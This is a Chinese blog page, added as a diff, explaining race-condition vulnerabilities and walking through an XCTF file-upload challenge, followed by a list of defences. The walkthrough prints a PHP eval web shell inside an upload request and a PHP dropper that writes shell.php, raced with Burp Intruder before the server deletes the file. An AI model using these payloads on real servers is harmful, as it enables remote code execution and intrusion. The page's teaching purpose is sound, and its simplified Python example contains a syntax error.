@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+
+
+<html theme="dark" showBanner="true" hasBanner="true" > 
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/fontawesome.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/brands.min.css" rel="stylesheet">
+<link href="https://cdn.staticfile.org/font-awesome/6.4.2/css/solid.min.css" rel="stylesheet">
+<script src="/js/color.global.min.js" ></script>
+<script src="/js/load-settings.js" ></script>
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+
+  
+  <title>条件竞争漏洞学习 | Rafferty&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <link rel="preload" href="/css/fonts/Roboto-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+  <link rel="preload" href="/css/fonts/Roboto-Bold.ttf" as="font" type="font/ttf" crossorigin="anonymous">
+
+  <meta name="description" content="Web安全条件竞争漏洞学习0x00 概述​		条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的，而">
+<meta property="og:type" content="article">
+<meta property="og:title" content="条件竞争漏洞学习">
+<meta property="og:url" content="https://raffertyzheng.github.io/2025/02/08/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Rafferty&#39;s Blog">
+<meta property="og:description" content="Web安全条件竞争漏洞学习0x00 概述​		条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的，而">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp">
+<meta property="og:image" content="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp">
+<meta property="og:image" content="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp">
+<meta property="og:image" content="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp">
+<meta property="article:published_time" content="2025-02-08T09:02:24.000Z">
+<meta property="article:modified_time" content="2025-07-19T01:18:36.019Z">
+<meta property="article:author" content="Rafferty Zheng">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp">
+  
+    <link rel="alternate" href="/atom.xml" title="Rafferty's Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/background.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Rafferty's Blog </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=/images/me.jpg></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Hailin Zheng </div>
+      <div class="dot"></div>
+      <div class="subtitle">Stay content and upward, gentle and firm. </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com/fishcanf1y" title="X"><i class="fa-brands fa-x-twitter"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/3537118364175129?spm_id_from=333.1007.0.0" title="Bilibili"><i class="fa-brands fa-bilibili"></i></a>
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Categories</h3>
+      <div class="category-box">
+            <a class="category-link" href="/categories/Coding/">
+                Coding
+                <div class="category-count">5</div>
+            </a>
+        
+            <a class="category-link" href="/categories/Pwn/">
+                Pwn
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/Crypto/">
+                Crypto
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/%E5%BA%95%E5%B1%82/">
+                底层
+                <div class="category-count">1</div>
+            </a>
+        
+            <a class="category-link" href="/categories/%E7%AE%97%E6%B3%95/">
+                算法
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/categories/CTF/">
+                CTF
+                <div class="category-count">7</div>
+            </a>
+        
+            <a class="category-link" href="/categories/AI/">
+                AI
+                <div class="category-count">3</div>
+            </a>
+        
+            <a class="category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">
+                Web安全
+                <div class="category-count">4</div>
+            </a>
+        </div>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">Tags</h3>
+      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/AI/" rel="tag">AI</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Attention/" rel="tag">Attention</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Coding/" rel="tag">Coding</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Deep-Learning/" rel="tag">Deep Learning</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ML/" rel="tag">ML</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/asm/" rel="tag">asm</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li></ul>
+    </div>
+  </div>
+
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-条件竞争漏洞学习" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        条件竞争漏洞学习
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2025-02-08T09:02:24.000Z" itemprop="datePublished">2025-02-08</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+  <a class="meta-cate-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            4.5k words 
+          </div>
+        </div>
+        
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>
+
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h2 id="Web安全条件竞争漏洞学习"><a href="#Web安全条件竞争漏洞学习" class="headerlink" title="Web安全条件竞争漏洞学习"></a>Web安全条件竞争漏洞学习</h2><h4 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h4><p>​		条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的，而开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p>
+<h6 id="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作"><a href="#简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作" class="headerlink" title="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作"></a>简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作</h6><h4 id="0x01-简单分析"><a href="#0x01-简单分析" class="headerlink" title="0x01 简单分析"></a>0x01 简单分析</h4><p>我们来设计一个简答的业务逻辑：商城系统中，用户提交折扣码，后端会检测用户是否已经使用过折扣码。若未使用过，则使用该折扣码，并记录折扣码使用状态为True。若已使用折扣码，用户再次使用折扣码时，后端程序读取折扣码使用状态为True，拒绝用户再次使用折扣码。</p>
+<p><img src="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp" alt="Lesson-eb3846115f6b8"></p>
+<p>我们在这里用一段简单的python代码来模拟后端逻辑，处理请求的<code>handle_req()</code>函数是并发（多线程&#x2F;多进程）执行的：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> **handle_req**():</span><br><span class="line">    <span class="keyword">if</span> code_already_used = <span class="literal">False</span>: <span class="comment"># 判断如果没有使用过折扣码（实际应该是对数据库的查询，此处简化写法）</span></span><br><span class="line">        use_code()				  <span class="comment"># 使用折扣码，对商品进行打折</span></span><br><span class="line">        code_already_used = <span class="literal">True</span>  <span class="comment"># 使用过折扣码后，将折扣码使用状态为True（实际应该是对数据库的数据更新，此处简化写法）</span></span><br><span class="line">    <span class="keyword">else</span>:						  <span class="comment"># 若已经使用过折扣码</span></span><br><span class="line">        reject_use_code()      	  <span class="comment"># 拒绝再次使用折扣码</span></span><br></pre></td></tr></table></figure>
+
+<p>但是这个过程可能会存在条件竞争漏洞，因为我们第一次请求判断的状态为false即未使用折扣码，但是第一个请求执行到第四行时准备更新数据库内容而第二个请求又开始执行并将折扣码使用状态再一次地标记为false，从而造成了使用了两次折扣码，触发了条件竞争漏洞，如下图所示：后端将记录折扣码使用状态为True之前，可能存在条件竞争，上述第2、3行代码执行的时间就是<code>竞争窗口</code>。</p>
+<p><img src="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp" alt="Lesson-eb3846115f6b8"></p>
+<p>　竞争窗口一般是一段很短的时间段（几毫秒甚至更短），用户通过并行发送多个数据包，使得服务端竞争窗口内执行多次特定的功能。</p>
+<p><img src="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp" alt="Lesson-eb3846115f6b8"></p>
+<h4 id="0x02-CTF中的条件竞争"><a href="#0x02-CTF中的条件竞争" class="headerlink" title="0x02 CTF中的条件竞争"></a>0x02 CTF中的条件竞争</h4><p>我们来看这样的一道题目</p>
+<p>【题型】<a href="">Web</a><br>【题目】<code>wzsc_文件上传</code><br>【来源】（[攻防世界](<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a><br>【思路】<a href="">条件竞争</a></p>
+<p>我们先上传一个一句话木马并把包拦截下来进行分析测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: Host:Port</span><br><span class="line">Content-Length: 230</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://61.147.171.105:56903</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMwWBoiGSKcfAYxLh</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: Host:Port</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryMwWBoiGSKcfAYxLh</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;classic.php&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryMwWBoiGSKcfAYxLh--</span><br></pre></td></tr></table></figure>
+
+<p>我们把它放到Repeater中放出去看看，查看返回包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 08 Feb 2025 09:38:03 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到这里的状态码是200，证明我们是可以成功上传但是在服务器中被删除了，那这时候可以使用以下思路</p>
+<p>我们先尝试访问我们上传的一句话并拦截包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /upload/classic.php HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:56903</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<p>这样，我们可以在<code>BurpSuite</code>中同时拦截下这两个数据包，然后发送至Intruder模块，将payload设置为<code>Null Payload</code>，并开始攻击，这样我们还需要搭配上这样的一句PHP代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>它的作用是只要我们上传的文件能被成功访问，它就能在服务器上新建一个<code>shell.php</code>并将一句话写入，从而使我们能够成功<code>getshel</code>l~</p>
+<p>用两个不同的数据包设置<code>Null Payload</code>的作用是利用我们提到的“竞争窗口”即上传成功到被删除的这一小段时间去访问我们上传的内鬼让其在服务器上生成一个接应我们的shell，其实简单地说就是用两个不同的操作去同时读写一个文件</p>
+<p><img src="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp" alt="4"></p>
+<p>Success to upload！</p>
+<p>成功拿到flag：<code>cyberpeace&#123;This_is_a_sample_flag&#125;</code></p>
+<h4 id="0x03-如何防御？"><a href="#0x03-如何防御？" class="headerlink" title="0x03 如何防御？"></a>0x03 如何防御？</h4><p>以下总结了一些防御方法和常见条件竞争漏洞示例及防御</p>
+<p>(1) 使用同步机制<br>    锁（Lock）：通过加锁确保同一时间只有一个线程或进程可以访问共享资源。<br>    信号量（Semaphore）：限制同时访问资源的线程或进程数量。<br>    互斥量（Mutex）：类似于锁，用于多线程环境。<br>(2) 原子操作<br>    使用原子操作确保操作的不可分割性。<br>    示例：<br>        数据库中的事务（Transaction）。<br>        编程语言中的原子类型（如 atomic 在 C++ 或 Java 中）。<br>(3) 避免共享资源<br>    尽量减少共享资源的使用，采用线程本地存储（Thread Local Storage, TLS）或进程隔离。<br>    示例：<br>        使用线程本地变量代替全局变量。<br>(4) 文件操作防御<br>    使用文件锁（File Lock）确保同一时间只有一个进程可以访问文件。<br>(5) 数据库操作防御<br>    使用事务（Transaction）和锁机制（如行锁、表锁）确保数据一致性。<br>(6) 时间窗口最小化<br>    减少竞争条件的发生概率，尽量缩短共享资源的访问时间。<br>    示例：<br>        在文件操作中，尽快释放文件锁。<br>(7) 使用不可变对象<br>    使用不可变对象（Immutable Objects）避免共享资源被修改。<br>    示例：<br>        在函数式编程中，尽量使用不可变数据结构。<br>(8) 输入验证和边界检查<br>    对用户输入进行严格验证，避免恶意输入触发竞争条件。<br>    示例：<br>        检查文件路径、用户权限等。<br>(9) 代码审查和测试<br>    通过代码审查发现潜在的竞争条件。<br>    使用压力测试和并发测试工具（如 JMeter、Locust）模拟高并发场景。</p>
+<p>常见条件竞争漏洞示例及防御<br>(1) TOCTOU（Time-of-Check to Time-of-Use）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">漏洞描述：在检查资源状态和使用资源之间存在时间窗口，攻击者可以利用这个时间窗口修改资源状态。</span><br><span class="line"></span><br><span class="line">防御方法：</span><br><span class="line"></span><br><span class="line">    使用原子操作（如 open() 的 O_EXCL 标志）。</span><br><span class="line"></span><br><span class="line">    示例（C 语言）：</span><br><span class="line">    c</span><br><span class="line">    复制</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;file.txt&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0644</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// 文件已存在</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>(2) 文件上传漏洞</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">漏洞描述：攻击者在上传文件时，利用时间窗口替换文件内容。</span><br><span class="line"></span><br><span class="line">防御方法：</span><br><span class="line"></span><br><span class="line">    使用临时文件，上传完成后再重命名。</span><br><span class="line"></span><br><span class="line">    示例：</span><br><span class="line">    python</span><br><span class="line">    复制</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tempfile.NamedTemporaryFile(delete=<span class="literal">False</span>) <span class="keyword">as</span> tmp_file:</span><br><span class="line">        tmp_file.write(<span class="string">b&quot;file content&quot;</span>)</span><br><span class="line">        tmp_path = tmp_file.name</span><br><span class="line"></span><br><span class="line">    os.rename(tmp_path, <span class="string">&quot;final_file.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>(3) 并发修改共享变量</p>
